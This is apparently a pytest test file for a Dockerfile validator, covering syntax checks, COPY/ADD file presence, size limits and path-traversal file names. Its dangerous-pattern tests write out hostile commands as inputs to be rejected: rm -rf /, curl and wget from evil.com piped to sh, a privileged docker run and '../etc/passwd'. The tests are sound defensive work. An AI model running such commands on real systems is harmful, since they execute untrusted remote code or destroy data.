"""Tests for Dockerfile validator."""

import pytest
from app.services.dockerfile_validator import (
    DockerfileValidator,
    ValidationResult,
    validate_dockerfile,
    validate_copy_commands,
    validate_source_file,
)


# Mark all tests in this module as not requiring database
pytestmark = pytest.mark.no_db


@pytest.fixture
def validator():
    return DockerfileValidator()


class TestDockerfileValidatorBasic:
    """Basic validation tests."""

    def test_valid_dockerfile(self, validator):
        dockerfile = """
FROM httpd:2.4.49
EXPOSE 80
CMD ["httpd-foreground"]
"""
        result = validator.validate(dockerfile)
        assert result.valid
        assert len(result.errors) == 0

    def test_empty_dockerfile(self, validator):
        result = validator.validate("")
        assert not result.valid
        assert "Dockerfile is empty" in result.errors

    def test_whitespace_only_dockerfile(self, validator):
        result = validator.validate("   \n  \n  ")
        assert not result.valid
        assert "Dockerfile is empty" in result.errors

    def test_missing_from(self, validator):
        dockerfile = """
RUN echo hello
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert "Missing required instruction: FROM" in result.errors

    def test_from_case_insensitive(self, validator):
        dockerfile = """
from alpine
RUN echo hello
"""
        result = validator.validate(dockerfile)
        assert result.valid

    def test_comments_and_args_before_from(self, validator):
        dockerfile = """
# This is a comment
ARG VERSION=latest
FROM alpine:${VERSION}
RUN echo hello
"""
        result = validator.validate(dockerfile)
        assert result.valid


class TestDockerfileValidatorSyntax:
    """Syntax validation tests."""

    def test_unknown_instruction(self, validator):
        dockerfile = """
FROM alpine
INVALID_INSTRUCTION echo hello
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("Unknown instruction" in e for e in result.errors)

    def test_line_continuation(self, validator):
        dockerfile = """
FROM alpine
RUN apt-get update && \\
    apt-get install -y curl && \\
    rm -rf /var/lib/apt/lists/*
"""
        result = validator.validate(dockerfile)
        assert result.valid

    def test_all_valid_instructions(self, validator):
        dockerfile = """
FROM alpine AS builder
ARG VERSION=1.0
ENV APP_HOME=/app
LABEL maintainer="test"
WORKDIR /app
COPY . .
ADD https://example.com/file.txt /tmp/
RUN echo "building"
EXPOSE 8080
VOLUME /data
USER nobody
HEALTHCHECK CMD curl -f http://localhost/ || exit 1
STOPSIGNAL SIGTERM
SHELL ["/bin/bash", "-c"]
ENTRYPOINT ["python"]
CMD ["app.py"]
"""
        result = validator.validate(dockerfile)
        # May have warnings but should be valid syntax
        assert result.valid or all("Unknown instruction" not in e for e in result.errors)


class TestDockerfileValidatorCopyAdd:
    """COPY/ADD file completeness tests."""

    def test_copy_without_file(self, validator):
        dockerfile = """
FROM alpine
COPY config.txt /app/
"""
        result = validator.validate(dockerfile, source_files=[])
        assert not result.valid
        assert any("config.txt" in e for e in result.errors)

    def test_copy_with_file(self, validator):
        dockerfile = """
FROM alpine
COPY config.txt /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "config.txt", "content": "hello"}
        ])
        assert result.valid

    def test_copy_multiple_files(self, validator):
        dockerfile = """
FROM alpine
COPY app.py /app/
COPY config.json /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "app.py", "content": "print(1)"},
            {"filename": "config.json", "content": "{}"}
        ])
        assert result.valid

    def test_copy_missing_one_file(self, validator):
        dockerfile = """
FROM alpine
COPY app.py /app/
COPY config.json /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "app.py", "content": "print(1)"}
        ])
        assert not result.valid
        assert any("config.json" in e for e in result.errors)

    def test_copy_dot_directory(self, validator):
        dockerfile = """
FROM alpine
COPY . /app/
"""
        result = validator.validate(dockerfile, source_files=[])
        assert result.valid  # "." is allowed without checking source_files

    def test_copy_wildcard(self, validator):
        dockerfile = """
FROM alpine
COPY *.py /app/
"""
        result = validator.validate(dockerfile, source_files=[])
        assert result.valid  # Wildcards are allowed

    def test_copy_with_chown(self, validator):
        dockerfile = """
FROM alpine
COPY --chown=nobody:nobody config.txt /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "config.txt", "content": "hello"}
        ])
        assert result.valid

    def test_copy_with_chmod(self, validator):
        dockerfile = """
FROM alpine
COPY --chmod=755 script.sh /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "script.sh", "content": "#!/bin/bash"}
        ])
        assert result.valid

    def test_copy_from_multistage(self, validator):
        dockerfile = """
FROM golang:1.21 AS builder
RUN go build -o /app

FROM alpine
COPY --from=builder /app /app
"""
        result = validator.validate(dockerfile, source_files=[])
        assert result.valid  # COPY --from should be skipped

    def test_add_with_url(self, validator):
        dockerfile = """
FROM alpine
ADD https://example.com/file.tar.gz /tmp/
"""
        result = validator.validate(dockerfile, source_files=[])
        assert result.valid  # URLs should be skipped

    def test_copy_normalized_path(self, validator):
        dockerfile = """
FROM alpine
COPY ./config.txt /app/
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "config.txt", "content": "hello"}
        ])
        assert result.valid


class TestDockerfileValidatorDangerous:
    """Dangerous pattern detection tests."""

    def test_dangerous_rm_rf_root(self, validator):
        dockerfile = """
FROM alpine
RUN rm -rf /
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("rm -rf" in e.lower() for e in result.errors)

    def test_dangerous_rm_rf_flags_order(self, validator):
        dockerfile = """
FROM alpine
RUN rm -fr /
"""
        result = validator.validate(dockerfile)
        assert not result.valid

    def test_safe_rm_rf_subdir(self, validator):
        dockerfile = """
FROM alpine
RUN rm -rf /tmp/cache
"""
        result = validator.validate(dockerfile)
        # This should be allowed - not removing root
        assert "Dangerous: rm -rf on root directory" not in result.errors

    def test_dangerous_curl_pipe_sh(self, validator):
        dockerfile = """
FROM alpine
RUN curl http://evil.com/script.sh | sh
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("curl pipe" in e.lower() for e in result.errors)

    def test_dangerous_curl_pipe_bash(self, validator):
        dockerfile = """
FROM alpine
RUN curl http://example.com/install.sh | bash
"""
        result = validator.validate(dockerfile)
        assert not result.valid

    def test_dangerous_wget_pipe(self, validator):
        dockerfile = """
FROM alpine
RUN wget -O - http://evil.com/script.sh | sh
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("wget pipe" in e.lower() for e in result.errors)

    def test_safe_curl_to_file(self, validator):
        dockerfile = """
FROM alpine
RUN curl -o /tmp/file.txt http://example.com/file.txt
"""
        result = validator.validate(dockerfile)
        assert result.valid


class TestDockerfileValidatorSecurity:
    """Security directive tests."""

    def test_privileged_blocked(self, validator):
        dockerfile = """
FROM alpine
RUN docker run --privileged test
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("--privileged" in e for e in result.errors)

    def test_copy_from_external_url(self, validator):
        dockerfile = """
FROM alpine
COPY --from=https://evil.com/image /app /app
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("external COPY --from" in e for e in result.errors)


class TestDockerfileValidatorWarnings:
    """Warning pattern tests."""

    def test_chmod_777_warning(self, validator):
        dockerfile = """
FROM alpine
RUN chmod 777 /app
"""
        result = validator.validate(dockerfile)
        assert result.valid  # Warnings don't make it invalid
        assert any("chmod 777" in w for w in result.warnings)

    def test_recursive_chmod_777_warning(self, validator):
        dockerfile = """
FROM alpine
RUN chmod -R 777 /app
"""
        result = validator.validate(dockerfile)
        assert result.valid
        assert any("chmod 777" in w.lower() for w in result.warnings)

    def test_add_url_warning(self, validator):
        dockerfile = """
FROM alpine
ADD https://example.com/file.tar.gz /tmp/
"""
        result = validator.validate(dockerfile)
        assert result.valid
        assert any("ADD with URL" in w for w in result.warnings)


class TestBackwardCompatibleFunctions:
    """Tests for backward-compatible function API."""

    def test_validate_dockerfile_valid(self):
        result = validate_dockerfile("FROM alpine\nRUN echo hello")
        assert result.valid

    def test_validate_dockerfile_invalid(self):
        result = validate_dockerfile("RUN echo hello")
        assert not result.valid
        assert "Missing required instruction: FROM" in result.errors

    def test_validate_copy_commands_missing_file(self):
        result = validate_copy_commands(
            "FROM alpine\nCOPY config.txt /app/",
            []
        )
        assert not result.valid
        assert any("config.txt" in e for e in result.errors)

    def test_validate_copy_commands_with_file(self):
        result = validate_copy_commands(
            "FROM alpine\nCOPY config.txt /app/",
            [{"filename": "config.txt", "content": "hello"}]
        )
        assert result.valid


class TestSourceFileValidation:
    """Tests for source file validation."""

    def test_valid_source_file(self):
        result = validate_source_file("config.txt", "hello world")
        assert result.valid

    def test_empty_filename(self):
        result = validate_source_file("", "content")
        assert not result.valid
        assert "Filename is empty" in result.errors

    def test_path_traversal_slash(self):
        result = validate_source_file("../etc/passwd", "content")
        assert not result.valid
        assert any("path traversal" in e.lower() for e in result.errors)

    def test_path_traversal_dotdot(self):
        result = validate_source_file("..config", "content")
        assert not result.valid

    def test_filename_too_long(self):
        result = validate_source_file("a" * 300, "content")
        assert not result.valid
        assert any("too long" in e for e in result.errors)

    def test_content_too_large(self):
        result = validate_source_file("file.txt", "x" * 2_000_000)
        assert not result.valid
        assert any("too large" in e for e in result.errors)


class TestEdgeCases:
    """Edge case tests."""

    def test_dockerfile_with_only_comments(self, validator):
        dockerfile = """
# Comment 1
# Comment 2
"""
        result = validator.validate(dockerfile)
        assert not result.valid
        assert "Missing required instruction: FROM" in result.errors

    def test_dockerfile_size_limit(self, validator):
        dockerfile = "FROM alpine\n" + "RUN echo hello\n" * 10000
        result = validator.validate(dockerfile)
        assert not result.valid
        assert any("too large" in e for e in result.errors)

    def test_heredoc_syntax(self, validator):
        """Test Dockerfile heredoc syntax (Docker BuildKit).

        Note: Heredoc syntax is NOT fully supported by the validator.
        The validator parses line-by-line and doesn't understand heredoc delimiters.
        This is a known limitation - heredocs inside RUN will cause false positive
        "Unknown instruction" errors, but the Dockerfile will still build correctly.
        """
        dockerfile = """
FROM alpine
RUN <<EOF
echo "hello"
echo "world"
EOF
"""
        result = validator.validate(dockerfile)
        # Heredoc content is incorrectly flagged as unknown instructions
        # This is a known limitation - we check that at least FROM is recognized
        assert "Missing required instruction: FROM" not in result.errors

    def test_multiple_from_statements(self, validator):
        """Test multi-stage build with multiple FROM."""
        dockerfile = """
FROM golang:1.21 AS builder
WORKDIR /app
COPY go.mod .
RUN go build -o main .

FROM alpine:latest
COPY --from=builder /app/main /main
CMD ["/main"]
"""
        result = validator.validate(dockerfile, source_files=[
            {"filename": "go.mod", "content": "module example"}
        ])
        assert result.valid
